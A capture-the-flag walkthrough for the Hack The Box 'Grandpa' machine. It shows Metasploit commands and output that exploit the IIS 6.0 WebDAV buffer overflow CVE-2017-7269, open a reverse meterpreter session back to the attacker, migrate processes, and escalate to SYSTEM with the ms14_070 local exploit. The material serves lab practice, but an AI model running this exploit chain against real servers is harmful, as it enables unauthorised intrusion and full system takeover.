---
description: Walkthrough (Easy)
---

# Grandpa 🟢🟢🟢

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

[https://app.hackthebox.com/machines/grandpa](https://app.hackthebox.com/machines/grandpa)&#x20;

Grandpa is one of the simpler machines on Hack The Box, however it covers the widely-exploited CVE-2017-7269. This vulnerability is trivial to exploit and granted immediate access to thousands of IIS servers around the globe when it became public knowledge.

### Reconnaissance

```bash
nmap -T4 -sVC 10.10.10.14 -oN Nmap
```

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

* Found only port 80 is open and running `IIS httpd 6.0`
* Google `IIS httpd 6.0`  got me WebDAV '`ScStoragePathFromUrl'` Remote Buffer Overflow
* Load `msfconsole`  and search for `ScStoragePathFromUrl` &#x20;

```bash
msf6 > use windows/iis/iis_webdav_scstoragepathfromurl
msf6 > set rhosts 10.10.10.14
msf6 > set lhost tun0
msf6 > run
```

### Migrate to stable processor&#x20;

{% code fullWidth="false" %}
```bash
meterpreter > ps

Process List
============

PID   PPID  Name               Arch  Session  User                          Path
---   ----  ----               ----  -------  ----                          ----

968  580   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.
2096  392   vssvc.exe
2328  580   wmiprvse.exe
2396  1484  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.e
2464  580   davcdata.exe       x86   0  

meterpreter > migrate 2396
[*] Migrating from 2636 to 2396...
[*] Migration completed successfully.

meterpreter > press(ctrl+z)
Background session 1? [y/N]  y

```
{% endcode %}

### Previlage Esculation

* Need to find any local exploit work on this session.

```bash
msf6 > use post/multi/recon/local_exploit_suggester

msf6 post(multi/recon/local_exploit_suggester) > set session 1
msf6 post(multi/recon/local_exploit_suggester) > run

#   Name                                           Vulnerable?  Check Result
 -   ----                                         -------------  ------------
 1   exploit/windows/local/ms10_015_kitrap0d             Yes      The service is running, but could not be validated.                                                                      
 2   exploit/windows/local/ms14_058_track_popup_menu     Yes      The target appears to be vulnerable.                                                                                     
 3   exploit/windows/local/ms14_070_tcpip_ioctl          Yes      The target appears to be vulnerable.                                                                                     
 4   exploit/windows/local/ms15_051_client_copy_image    Yes      The target appears to be vulnerable.                                                                                     
 5   exploit/windows/local/ms16_016_webdav               Yes      The service is running, but could not be validated.                                                                      
 6   exploit/windows/local/ppr_flatten_rec               Yes      The target appears to be vulnerable.
```

* Tried but best suits `exploit/windows/local/ms14_070_tcpip_ioctl`

```bash
msf6 > use exploit/windows/local/ms14_070_tcpip_ioctl
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > sessions

Active sessions
===============

  Id  Name  Type                     Information                           Connection
  --  ----  ----                     -----------                           ----------
  1         meterpreter x86/windows  NT AUTHORITY\NETWORK SERVICE @ GRANP  10.10.16.6:1234 -> 10.10.10.14:1030
                                     A                                     (10.10.10.14)

msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > set session 1
msf6 exploit(windows/local/ms14_070_tcpip_ioctl) > run

meterpreter > ps

Process List
============
1940  392   alg.exe            x86   0        NT AUTHORITY\LOCAL SERVICE    C:\WINDOWS\System32\alg.exe
1968  580   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.
2328  580   wmiprvse.exe       x86   0        NT AUTHORITY\SYSTEM           C:\WINDOWS\system32\wbem\wmiprvse.
2396  1484  w3wp.exe           x86   0        NT AUTHORITY\SYSTEM           c:\windows\system32\inetsrv\w3wp.e
2464  580   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcda

# Got some SYSTEM processors so now migrate to SYSTEM
meterpreter > migrate 2328

meterpreter > shell

C:\WINDOWS\system32>whoami
whoami
nt authority\system
```

* Now we are root and have all access over the machine.
* User flag -> C:\Documents and Settings>`type Harry\Desktop\user.txt`
* Root flag -> C:\Documents and Settings>`type Administrator\Desktop\root.txt`

<figure><img src="../.gitbook/assets/image (75).png" alt=""><figcaption></figcaption></figure>
